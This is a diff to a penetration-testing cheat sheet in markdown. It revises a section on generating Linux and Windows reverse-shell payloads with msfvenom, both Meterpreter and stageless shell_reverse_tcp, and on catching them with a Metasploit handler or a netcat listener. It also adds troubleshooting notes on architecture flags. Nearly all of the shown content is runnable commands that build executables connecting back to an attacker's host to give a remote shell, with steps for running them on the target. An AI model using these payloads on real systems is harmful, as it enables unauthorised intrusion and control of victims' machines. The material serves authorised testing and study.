@@ -34,14 +34,18 @@ Full netcat reference in [netcat](netcat.md); pwncat in [pwncat](pwncat.md).
 
 ### With Metasploit — generate a payload and catch it
 
-When you'd rather drop a payload file than paste a one-liner. Generate with `msfvenom`, set your `IP`/`PORT`, and get the file onto the target (transfer options in [netcat](netcat.md)).
+When you'd rather drop a payload file than paste a one-liner. Generate with `msfvenom`, set your `IP`/`PORT`, and get the file onto the target (transfer options in [netcat](netcat.md)). The `-a x64 --platform linux` below is pinned explicitly so msfvenom doesn't print the `No Arch selected` / `No platform was selected` notices.
 
 ```bash
 # Linux target (x64) — standard meterpreter
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp -a x64 --platform linux LHOST=IP LPORT=PORT -f elf -o shell.elf
 # Windows target (x64) — standard meterpreter
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows LHOST=IP LPORT=PORT -f exe -o shell.exe
 ```
+
+> **`[-] No Arch selected, selecting Arch: x64 from the payload` is NOT an error** — it's an info line (note the misleading red `[-]`), and the file is still written. The command only "fails" if the shell prompt returns with no `Saved as: shell.elf`. Confirm it built: `ls -l shell.elf && file shell.elf`. Pinning `-a`/`--platform` as above removes the message entirely.
+>
+> **32-bit or unknown target?** A `x64` ELF won't run on a 32-bit host (`cannot execute binary file: Exec format error`). Swap to `-p linux/x86/shell_reverse_tcp -a x86 --platform linux` — a 32-bit payload is the safest "runs anywhere" choice when you're not sure of the target's architecture.
 
 Catch it with the **matching handler** — a meterpreter payload will **not** work over a plain `nc` listener:
 
@@ -56,11 +60,11 @@ Then run it on the target (`chmod +x shell.elf; ./shell.elf`, or execute `shell.
 **"Always works" fallback — stageless, caught by plain `nc`.** If staging is flaky or you just want a raw shell in the `nc -lvnp PORT` listener you already have, swap meterpreter for the self-contained `shell_reverse_tcp`:
 
 ```bash
-msfvenom -p linux/x64/shell_reverse_tcp   LHOST=IP LPORT=PORT -f elf -o shell.elf    # catch: nc -lvnp PORT
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe    # catch: nc -lvnp PORT
+msfvenom -p linux/x64/shell_reverse_tcp   -a x64 --platform linux   LHOST=IP LPORT=PORT -f elf -o shell.elf    # catch: nc -lvnp PORT
+msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=IP LPORT=PORT -f exe -o shell.exe    # catch: nc -lvnp PORT
 ```
 
-Swap `x64` → `x86` for 32-bit targets; if unsure on Windows, the `x86` payload runs on both. More in [Metasploit](../Tools/Metasploit.md) (`multi/handler`).
+Swap `x64` → `x86` (and `-a x64` → `-a x86`) for 32-bit targets; if unsure on Windows, the `x86` payload runs on both. More in [Metasploit](../Tools/Metasploit.md) (`multi/handler`).
 
 ## Reverse shell one-liners
 
